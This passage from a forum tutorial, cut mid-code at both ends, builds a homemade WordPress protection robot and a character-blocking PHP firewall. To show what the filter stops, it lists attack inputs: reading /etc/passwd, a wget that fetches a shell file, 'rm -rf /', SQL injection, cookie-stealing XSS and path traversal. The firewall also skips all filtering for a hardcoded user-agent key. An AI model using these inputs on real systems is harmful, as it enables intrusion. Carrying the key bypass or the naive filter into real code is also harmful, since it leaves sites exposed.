style="color: #0000BB">err_c&nbsp;is&nbsp;100</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">60</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>And now kill.py for stop process.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:216px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#kill.py<br />#!/usr/bin/python<br />#By&nbsp;Ali&nbsp;Razmjoo<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/kill.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()&nbsp;</span><span style="color: #FF8000">#start&nbsp;multiprocessing<br /></span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'ps&nbsp;aux&nbsp;|&nbsp;grep&nbsp;.py&nbsp;&gt;&nbsp;/root/id.txt'</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/root/id.txt'</span><span style="color: #007700">)<br />for&nbsp;</span><span style="color: #0000BB">line&nbsp;in&nbsp;f</span><span style="color: #007700">:<br />&nbsp;&nbsp;</span><span style="color: #0000BB">line&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">line</span><span style="color: #007700">.</span><span style="color: #0000BB">rsplit</span><span style="color: #007700">()<br />&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pid&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">int</span><span style="color: #007700">(</span><span style="color: #0000BB">line</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">1</span><span style="color: #007700">&#93;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">cmd&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'kill&nbsp;-9&nbsp;'&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">pid</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">cmd</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">except</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">skip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1&nbsp;<br /></span>
</span>
</code></code></div>
</div>At last check.php file content is simple. Just a file will open my site and you may print the content.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:108px;"><code><code><span style="color: #000000">
#check.php<br /><span style="color: #0000BB">&lt;?php<br />$homepage&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'http://z3r0d4y.com/'</span><span style="color: #007700">);<br />if(</span><span style="color: #0000BB">$homepage</span><span style="color: #007700">){<br />echo&nbsp;</span><span style="color: #0000BB">$homepage<br /></span><span style="color: #007700">}<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div>Setup example:<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:120px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">wget&nbsp;https</span><span style="color: #007700">:</span><span style="color: #FF8000">//github.com/Ali-Razmjoo/z3r0d4y/blob/master/service.zip?raw=true&nbsp;--no-check-certificate<br /></span><span style="color: #0000BB">unzip&nbsp;service</span><span style="color: #007700">.</span><span style="color: #0000BB">zip<br />cd&nbsp;service<br />mv&nbsp;</span><span style="color: #007700">*&nbsp;../<br /></span><span style="color: #0000BB">cd&nbsp;</span><span style="color: #007700">..<br /></span><span style="color: #0000BB">rm&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">rf&nbsp;service<br />cd&nbsp;daemon<br />make&nbsp;<br /></span>
</span>
</code></code></div>
</div>If return you any error. <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:96px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">yum&nbsp;install&nbsp;gcc<br />gcc&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon</span><span style="color: #007700">.</span><span style="color: #0000BB">c&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">o&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon<br />cp&nbsp;start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">usr</span><span style="color: #007700">/</span><span style="color: #0000BB">sbin</span><span style="color: #007700">/<br /></span><span style="color: #0000BB">chmod&nbsp;755&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">usr</span><span style="color: #007700">/</span><span style="color: #0000BB">sbin</span><span style="color: #007700">/</span><span style="color: #0000BB">start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon<br />start</span><span style="color: #007700">-</span><span style="color: #0000BB">stop</span><span style="color: #007700">-</span><span style="color: #0000BB">daemon&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">V<br /></span><span style="color: #FF8000">#output:&nbsp;start-stop-daemon&nbsp;1.9.18&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>And then <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:120px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">cd&nbsp;</span><span style="color: #007700">..<br /></span><span style="color: #0000BB">rm&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">rf&nbsp;daemon<br />rm&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">rf&nbsp;service</span><span style="color: #007700">.</span><span style="color: #0000BB">zip<br />mv&nbsp;zeroday&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">etc</span><span style="color: #007700">/</span><span style="color: #0000BB">init</span><span style="color: #007700">.</span><span style="color: #0000BB">d</span><span style="color: #007700">/<br /></span><span style="color: #0000BB">chmod&nbsp;755&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">etc</span><span style="color: #007700">/</span><span style="color: #0000BB">init</span><span style="color: #007700">.</span><span style="color: #0000BB">d</span><span style="color: #007700">/</span><span style="color: #0000BB">zeroday<br />mv&nbsp;</span><span style="color: #007700">*.</span><span style="color: #0000BB">py&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">root</span><span style="color: #007700">/<br /></span><span style="color: #0000BB">cd&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">root</span><span style="color: #007700">/<br /></span><span style="color: #0000BB">chmod&nbsp;755&nbsp;</span><span style="color: #007700">*.</span><span style="color: #0000BB">py&nbsp;<br /></span>
</span>
</code></code></div>
</div>And now run and edit md5.py <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:144px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#nano&nbsp;md5.py&nbsp;=&gt;&nbsp;replace&nbsp;public_html&nbsp;directory&nbsp;in&nbsp;line&nbsp;13<br /></span><span style="color: #007700">&#91;</span><span style="color: #0000BB">root</span><span style="color: #007700">@</span><span style="color: #0000BB">localhost&nbsp;</span><span style="color: #007700">~&#93;</span><span style="color: #FF8000">#&nbsp;python&nbsp;md5.py&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;output:<br /></span><span style="color: #0000BB">d41d8cd98f00b204e9800998ecf8427e<br />Stopping&nbsp;httpd</span><span style="color: #007700">:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#91;&nbsp;&nbsp;</span><span style="color: #0000BB">OK&nbsp;&nbsp;</span><span style="color: #007700">&#93;<br /><br /></span><span style="color: #0000BB">All&nbsp;Dead<br /><br />Killed<br /></span><span style="color: #FF8000">#-------------------------------------------------<br /></span><span style="color: #0000BB">nano&nbsp;md5</span><span style="color: #007700">.</span><span style="color: #0000BB">py&nbsp;<br /></span>
</span>
</code></code></div>
</div>Go to line 52 and replace this md5 with md5 inside file ,And try to run it again. <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:108px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #007700">&#91;</span><span style="color: #0000BB">root</span><span style="color: #007700">@</span><span style="color: #0000BB">localhost&nbsp;</span><span style="color: #007700">~&#93;</span><span style="color: #FF8000">#&nbsp;python&nbsp;md5.py<br /></span><span style="color: #0000BB">d41d8cd98f00b204e9800998ecf8427e<br />pass&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">md5</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">d41d8cd98f00b204e9800998ecf8427e<br />d41d8cd98f00b204e9800998ecf8427e<br />pass&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">md5</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">d41d8cd98f00b204e9800998ecf8427e<br />d41d8cd98f00b204e9800998ecf8427e<br />pass&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">md5</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">d41d8cd98f00b204e9800998ecf8427e&nbsp;<br /></span>
</span>
</code></code></div>
</div>Next step you have to replace php file link address in out.py at line 8. And now it’s working now.<br />
<br />
And now about that php file , you should replace your primary word to your site name or title and then upload it on other host [you can also use free hosting as I said before] and now your service works well.<br />
<br />
Until now, if your server files change, this robot will stop Apache webserver, so it means any one cannot upload any badware [ shell scripts or anything ] on your website or deface your website or if any DOS/DDOS attack or crashing happen, it will ban attacker(s) IP and restart Apache webserver. this robot need to develop to work more easy and if I get more free time I’ll improve it and make it easy to work.<br />
<br />
But now , about other 0day Vulnerabilities on wordpress or plugins [Or any CMS you used] , We need to filter something on GET and POST Requests but if you think I want start listing words same<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:120px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">union<br />select<br />wget<br />alert</span><span style="color: #007700">(<br /></span><span style="color: #0000BB">wget<br />curl<br />information<br /></span><span style="color: #007700">and&nbsp;</span><span style="color: #0000BB">bla&nbsp;bla&nbsp;<br /></span>
</span>
</code></code></div>
</div>You are so wrong, because it’s so ridicules and it bypass easy so the best way it’s filter these characters. <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:36px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #007700">!@</span><span style="color: #FF8000">#$%^&amp;*()_+=-\|}{&#91;&#93;:"</span><span style="color: #0000BB">?&gt;</span>&lt;;'/.,&nbsp;<br /></span>
</code></code></div>
</div>Note: I said filter GET and POST, It’s just an example for inputs.<br />
 If we filter these characters most vulnerabilities will disable Examples:<br />
<br />
RCE: <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:108px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">cat&nbsp;</span><span style="color: #007700">/</span><span style="color: #0000BB">etc</span><span style="color: #007700">/</span><span style="color: #0000BB">passwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;=&nbsp;&nbsp;</span><span style="color: #0000BB">This&nbsp;Char&nbsp;filtered&nbsp;by&nbsp;firewall<br />ls&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">la&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;-<br />echo&nbsp;</span><span style="color: #0000BB">1&nbsp;</span><span style="color: #007700">&gt;&nbsp;</span><span style="color: #0000BB">1&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;&nbsp;&nbsp;&gt;<br /></span><span style="color: #0000BB">wget&nbsp;http</span><span style="color: #007700">:</span><span style="color: #FF8000">//z3r0d4y.com/shell.txt&nbsp;=&gt;&nbsp;://&nbsp;.&nbsp;.<br /></span><span style="color: #0000BB">curl&nbsp;z3r0d4y</span><span style="color: #007700">.</span><span style="color: #0000BB">com&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;.<br /></span><span style="color: #0000BB">rm&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">rf&nbsp;</span><span style="color: #007700">/&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;-&nbsp;/<br /></span><span style="color: #0000BB">rm&nbsp;</span><span style="color: #007700">*&nbsp;&nbsp;&nbsp;=&gt;&nbsp;*&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>SQL:<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:48px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">Union&nbsp;Select&nbsp;1</span><span style="color: #007700">,</span><span style="color: #0000BB">2</span><span style="color: #007700">,</span><span style="color: #0000BB">3</span><span style="color: #007700">,</span><span style="color: #0000BB">4</span><span style="color: #007700">,</span><span style="color: #0000BB">5&nbsp;from&nbsp;admin</span><span style="color: #007700">--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&nbsp;,&nbsp;-<br /></span><span style="color: #0000BB">hex</span><span style="color: #007700">(&nbsp;,&nbsp;</span><span style="color: #0000BB">unhex</span><span style="color: #007700">(&nbsp;,&nbsp;</span><span style="color: #0000BB">grpup_contact</span><span style="color: #007700">(&nbsp;,&nbsp;</span><span style="color: #0000BB">bla&nbsp;bla&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;(&nbsp;</span><span style="color: #0000BB">_&nbsp;<br /></span>
</span>
</code></code></div>
</div>XSS:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:72px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">alert</span><span style="color: #007700">(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;(&nbsp;&nbsp;<br />&lt;</span><span style="color: #0000BB">img</span><span style="color: #007700">&gt;&nbsp;&lt;&nbsp;&nbsp;<br /></span><span style="color: #0000BB">scr</span><span style="color: #007700">=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;=&nbsp;&nbsp;<br /></span><span style="color: #0000BB">document</span><span style="color: #007700">.</span><span style="color: #0000BB">cookie&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;.&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>LFI:<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:48px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #007700">/</span><span style="color: #0000BB">etc</span><span style="color: #007700">/</span><span style="color: #0000BB">passwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">=&gt;&nbsp;/&nbsp;&nbsp;<br />../&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;.&nbsp;/&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>And more …<br />
<br />
See everything filtered by a simple way, But it’s not all. Wordpress Admin panel and guest users need to send this chars. we should not block them from comment or block admin requests for send post or any jquery or java POSTs in admin panel. So we need a white list [Exception list] to Handle these. All you to do is put “wp-comments-post.php” file in white list for users comments and generate a random MD5 or any primary key for using on Admin user agent and handle in Exception. Then you can have your private key to be admin and login in admin panel, send your posts without any problem [My Suggestion is use Firefox UserAgent switcher Add-Ons]. Next Step is Handle your code in config.php and we done with our WAF.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">//Code&nbsp;By&nbsp;Ali&nbsp;Razmjoo<br />//waf.php<br />//https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/waf.php<br /></span><span style="color: #0000BB">$list_exceptions&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">"/wp-comments-post.php"</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$list_deny&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">"`"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"~"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"!"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"@"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"#"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"$"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"%"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"^"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"&amp;"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"*"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"("</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">")"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"-"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"_"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"+"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"&#91;"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"&#93;"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"{"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"}"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"\\"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"|"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">";"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">":"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"'"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'"'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"&lt;"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"&gt;"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"?"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"/"</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">","</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">"."</span><span style="color: #007700">,<br />);<br /></span><span style="color: #0000BB">$detect&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$get&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$protocol&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'SERVER_PROTOCOL'</span><span style="color: #007700">&#93;),</span><span style="color: #DD0000">'https'</span><span style="color: #007700">)&nbsp;===&nbsp;</span><span style="color: #0000BB">FALSE&nbsp;</span><span style="color: #007700">?&nbsp;</span><span style="color: #DD0000">'http'&nbsp;</span><span style="color: #007700">:&nbsp;</span><span style="color: #DD0000">'https'</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$host&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'HTTP_HOST'</span><span style="color: #007700">&#93;;<br /></span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'SCRIPT_NAME'</span><span style="color: #007700">&#93;;<br /></span><span style="color: #0000BB">$params&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'QUERY_STRING'</span><span style="color: #007700">&#93;;<br /></span><span style="color: #0000BB">$currentUrl&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$protocol&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #DD0000">'://'&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">$host&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #DD0000">'?'&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">$params</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$script&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$params&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$params</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$params&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$params</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$params&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$params</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$params&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urldecode</span><span style="color: #007700">(</span><span style="color: #0000BB">$params</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$agent&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'HTTP_USER_AGENT'</span><span style="color: #007700">&#93;;<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$params</span><span style="color: #007700">,</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$get&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(</span><span style="color: #0000BB">$j</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_exceptions</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">,</span><span style="color: #0000BB">$list_exceptions</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$get&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$get&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$agent</span><span style="color: #007700">,</span><span style="color: #DD0000">'b00c52cac042640c440db9684a59ae36'</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_GET&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"***&#91;firewall&#93;***"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />}<br />foreach(</span><span style="color: #0000BB">$_POST&nbsp;</span><span style="color: #007700">as&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: 